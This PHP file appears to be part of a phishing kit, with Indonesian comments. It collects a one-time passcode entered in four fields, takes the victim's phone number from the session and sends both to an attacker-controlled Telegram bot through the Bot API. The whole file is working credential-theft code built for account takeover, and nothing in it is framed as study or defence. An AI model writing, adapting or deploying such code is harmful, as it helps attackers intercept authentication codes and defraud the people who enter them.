<?php
/* File: req/thre.php */
include "../telegram.php"; 
session_start();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    
    // Ambil data OTP
    $otp = (isset($_POST['otp1']) ? $_POST['otp1'] : '') .
           (isset($_POST['otp2']) ? $_POST['otp2'] : '') .
           (isset($_POST['otp3']) ? $_POST['otp3'] : '') .
           (isset($_POST['otp4']) ? $_POST['otp4'] : '');
    
    // Ambil nomor HP dari session
    $nohp = isset($_SESSION['nohp']) ? $_SESSION['nohp'] : 'Tidak Ada Nomor';

    // Format Pesan Telegram (Tanpa IP User)
    $message = "📩 *OTP DITERIMA*\n";
    $message .= "──────────────────\n";
    $message .= "📱 *Nomor HP:* `" . $nohp . "`\n";
    
    $message .= "🔔 *Kode OTP:* `" . $otp . "`\n";
    $message .= "⏰ *Waktu:* " . date('d-m-Y H:i:s') . "\n";
    $message .= "──────────────────";

    function sendMessage($id_telegram, $message, $id_botTele) {
        $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage";
        $data = [
            'chat_id' => $id_telegram,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }

    if (!empty($otp)) {
        sendMessage($id_telegram, $message, $id_botTele);
    }

    echo "success";
    exit();
}
?>
